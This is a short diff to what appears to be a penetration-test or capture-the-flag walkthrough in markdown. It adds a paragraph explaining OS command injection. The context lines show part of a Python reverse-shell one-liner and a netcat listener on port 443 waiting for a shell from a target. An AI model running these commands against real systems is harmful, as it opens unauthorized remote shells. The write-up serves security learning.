@@ -29,3 +29,6 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 rlwrap nc -nvlp 443
 ```
 ![NetCat listening on port 443 for incoming reverse shell from target](netcat443.png)
+
+### Issue Context
+Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.  
